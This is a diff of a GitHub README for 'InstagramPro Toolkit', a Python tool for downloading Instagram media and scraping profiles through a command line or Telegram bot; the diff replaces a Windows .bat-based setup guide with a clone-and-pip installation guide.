@@ -1,133 +1,131 @@
-# ✨ Instagram Pro Toolkit
+# InstagramPro Toolkit 🚀
 
-<div align="center">
-  <img src="https://raw.githubusercontent.com/egonelbre/gophers/master/animation/gopher-dance-long-3x.gif" alt="Animated Logo" width="300" />
+![GitHub release](https://img.shields.io/github/release/shivamk21-ssk/InstagramPro-Toolkit.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg)
 
-  <h2><strong>🚀 Ultimate Instagram Downloader & Telegram Bot Automation</strong></h2>
+Welcome to the **InstagramPro Toolkit**! This repository provides a powerful Python-based solution for downloading content from Instagram and automating tasks via a Telegram bot. Whether you need to download reels, multi-posts, or scrape profiles, this toolkit has you covered.
 
-  ![Python](https://img.shields.io/badge/Python-3.13.2-blue?style=for-the-badge&logo=python&logoColor=white)
-  ![Windows](https://img.shields.io/badge/Platform-Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white)
-  ![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
-  ![Status](https://img.shields.io/badge/Status-Active-success?style=for-the-badge)
-</div>
+## Table of Contents
 
----
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Platforms](#supported-platforms)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## 🌟 Overview
+## Features
 
-**Instagram Pro Toolkit** is an all-in-one solution for automating Instagram downloads and scraping tasks. With built-in support for a persistent **Telegram bot**, it allows background operation even after closing the script—until you explicitly terminate it with a `.bat` file.
+- **Instagram Downloader**: Download images, videos, and stories from Instagram effortlessly.
+- **Telegram Bot**: Run a Telegram bot that can handle requests in the background.
+- **Support for Premium Links**: Download content from premium links without hassle.
+- **Reels and Multi-Posts**: Grab reels and multi-posts with a single command.
+- **Profile Scraping**: Extract information from Instagram profiles easily.
+- **Private Account Support**: Download content from private accounts if you have access.
+- **Automation**: Automate repetitive tasks using Python scripts.
 
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/74038190/212750147-854a394f-fee9-4080-9770-78a4b7ece53f.gif" alt="Divider" />
-</div>
+## Installation
 
-## 🚀 Key Features
+To set up the InstagramPro Toolkit, follow these steps:
 
-- 🎥 **Download Reels & Multi-posts** with ease
-- 🖼️ **Profile Picture Downloader** — full-size, high quality
-- 🧠 **Profile Data Scraper** — collect bios, followers, and more
-- 🔗 **Premium Link Support** — fetches content not easily accessible
-- 🤖 **Telegram Bot Integration** — interact anytime, from anywhere
-- 🕒 **Persistent Background Process** — runs all day unless explicitly terminated
-- 🧼 **Clean CLI Interface** — smooth flow & animations for each interaction
-- 🔐 **Auto Setup & Authentication** — one-click deployment with Python validation
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/shivamk21-ssk/InstagramPro-Toolkit.git
+   cd InstagramPro-Toolkit
+   ```
 
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/74038190/213910845-af37a709-8995-40d6-be59-724526e3c3d7.gif" alt="Feature Animation" width="450" />
-</div>
+2. **Install Dependencies**:
+   Make sure you have Python 3.8 or higher installed. Then, install the required packages:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
----
+3. **Configuration**:
+   Update the configuration file to set your Instagram and Telegram credentials.
 
-## 🛠️ Installation
+4. **Run the Bot**:
+   Start the bot using:
+   ```bash
+   python bot.py
+   ```
 
-### 🔧 Prerequisites
+## Usage
 
-- ✅ Python **3.13.2**
-- ✅ **Windows OS**
-- The script checks and installs missing dependencies automatically.
+Once you have the toolkit installed, you can start using it right away. Here’s how:
 
-### 📦 Method 1: Windows (Recommended)
+### Downloading Content
 
-1. Download/Clone this InstagramPro-ToolKit Repository
-2. Extract the `.zip` file
-3. Run `Instagram_Pro.bat` as Administrator
+To download content from Instagram, you can use the command line or the Telegram bot. 
 
+#### Command Line
 
-
----
-
-## 🎮 Usage Guide
-
-1. Double-click `Instagram_Pro.bat`
-2. Accept admin prompt if asked
-3. The script will:
-   - Auto-check Python 3.13.2
-   - Setup Telegram bot in background
-   - Let you choose your Instagram task
-4. All operations continue until stopped via `Terminate.bat`
-
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/74038190/212747107-5b654ba5-31c6-4366-b42b-51b822e9bc52.gif" alt="Usage Animation" width="600" />
-</div>
-
----
-
-## 📋 Dependencies
-
-Installed automatically by the script:
-
-```
-requests>=2.31.0
-python-telegram-bot>=13.15
-pillow>=9.5.0
-tqdm>=4.66.1
-cryptography>=41.0.3
-colorama>=0.4.6
-pyyaml>=6.0.1
+Run the following command to download a post:
+```bash
+python download.py <Instagram URL>
 ```
 
+Replace `<Instagram URL>` with the link to the post you want to download.
+
+#### Telegram Bot
+
+1. Open your Telegram app.
+2. Search for your bot and start a chat.
+3. Send the command to download content:
+   ```
+   /download <Instagram URL>
+   ```
+
+### Scraping Profiles
+
+To scrape a profile, use the following command:
+```bash
+python scrape.py <Instagram Username>
+```
+
+This will gather information such as the number of followers, posts, and bio.
+
+## Supported Platforms
+
+- **Windows**
+- **Linux**
+- **macOS**
+
+The toolkit is designed to run smoothly on all major operating systems.
+
+## Contributing
+
+We welcome contributions! If you have suggestions for improvements or want to add features, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add your feature"
+   ```
+4. Push to the branch:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Create a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any inquiries or support, please reach out to the repository owner:
+
+- **Shivam Kumar** - [GitHub Profile](https://github.com/shivamk21-ssk)
+
+## Releases
+
+To download the latest version of the toolkit, visit the [Releases](https://github.com/shivamk21-ssk/InstagramPro-Toolkit/releases) section. You can find the latest executable files there.
+
 ---
 
-## 🧩 Troubleshooting
-
-<details>
-<summary><strong>🔍 Script doesn't start</strong></summary>
-
-- Run `.bat` file as **Administrator**
-- Ensure Python 3.13.2 is installed or let script handle it
-- Check file structure inside the folder
-</details>
-
-<details>
-<summary><strong>🔍 Python install fails</strong></summary>
-
-- Download Python 3.13.2 manually from [python.org](https://www.python.org/downloads/)
-- Ensure "Add to PATH" is checked
-- Rerun `Instagram_Pro.bat`
-</details>
-
-<details>
-<summary><strong>🔍 Bot or download issues</strong></summary>
-
-- Check your internet connection
-- Review Telegram bot token setup
-- Report issues on GitHub with screenshots
-</details>
-
----
-
-## 📜 License
-
-Licensed under the MIT License. See [`LICENSE`](LICENSE) for full terms.
-
----
-
-<div align="center">
-  <img src="https://raw.githubusercontent.com/Anmol-Baranwal/Cool-GIFs-For-GitHub/main/images/hyperkitty.gif" alt="Footer Animation" width="350" />
-
-  <p>Made with ❤️ by <strong>Zork</strong></p>
-
-  <a href="https://github.com/samay825">
-    <img src="https://img.shields.io/badge/GitHub-Follow_Me-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub Follow" />
-  </a>
-</div>
+Thank you for using InstagramPro Toolkit! We hope you find it useful for all your Instagram downloading and automation needs. If you have any feedback or issues, please don't hesitate to reach out.
